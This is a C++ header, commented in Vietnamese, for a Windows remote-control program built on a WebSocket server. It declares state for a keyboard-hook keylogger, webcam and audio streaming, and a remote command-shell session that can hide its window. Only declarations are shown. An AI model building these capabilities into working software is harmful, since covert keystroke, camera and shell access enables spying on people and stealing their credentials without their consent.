#pragma once

// CẤU HÌNH & THƯ VIỆN
#define _WINSOCK_DEPRECATED_NO_WARNINGS // [FIX] Cho phép dùng hàm mạng cũ (gethostbyname)
#define _CRT_SECURE_NO_WARNINGS         // [FIX] Cho phép dùng hàm C cũ (sprintf...)
#define WIN32_LEAN_AND_MEAN             // Giảm bớt thư viện Windows thừa
#define NOMINMAX                        // Tránh xung đột hàm min/max
#define ASIO_STANDALONE                 // Dùng ASIO độc lập
#define _WEBSOCKETPP_CPP11_TYPE_TRAITS_ // Cấu hình Websocket++

// Thư viện C++ Chuẩn
#include <iostream>
#include <string>
#include <vector>
#include <algorithm>
#include <thread>
#include <mutex>
#include <vector>
#include <memory>
#include <set>      
#include <fstream>  

// Thư viện Mạng
#include <websocketpp/config/asio_no_tls.hpp>
#include <websocketpp/server.hpp>
#include <nlohmann/json.hpp>

// Thư viện OpenCV
#include <opencv2/opencv.hpp>
#include <opencv2/imgcodecs.hpp>

#pragma warning(pop)

// Thư viện Windows & Đồ họa
#include <windows.h>
#include <tlhelp32.h> 
#include <shellapi.h> 
#include <objidl.h> 
#include <gdiplus.h>

#pragma comment(lib, "gdiplus.lib") 
#pragma comment(lib, "ws2_32.lib")

using namespace Gdiplus;
using json = nlohmann::json;
typedef websocketpp::server<websocketpp::config::asio> server;

// KHAI BÁO BIẾN TOÀN CỤC
extern std::string g_KeylogBuffer;
extern std::mutex g_LogMutex;
extern HHOOK g_hHook;
extern std::set<DWORD> g_PendingModifiers;
extern bool g_IsStreaming;
extern std::thread* g_WebcamThread;

// Audio streaming
extern bool g_IsStreamingAudio;
extern std::thread* g_AudioThread;

// Keylogger Mode: "buffer" hoặc "realtime"
extern std::string g_KeylogMode;
extern server* g_ServerPtr;
extern websocketpp::connection_hdl g_ClientHdl;
extern bool g_ClientConnected;

// CMD Terminal Session
extern HANDLE g_CmdProcess;
extern HANDLE g_CmdStdInWrite;
extern HANDLE g_CmdStdOutRead;
extern std::thread* g_CmdReaderThread;
extern bool g_CmdRunning;
extern bool g_CmdShowWindow;

// KHAI BÁO HÀM TIỆN ÍCH
std::string ToLower(std::string str);
bool IsKeyDown(int vk);
std::string Base64Encode(unsigned char const* bytes_to_encode, unsigned int in_len);
std::string Base64Decode(const std::string& encoded_string);
std::vector<unsigned char> ReadFileToBuffer(const std::string& filepath);

std::string GetLocalIPAddress();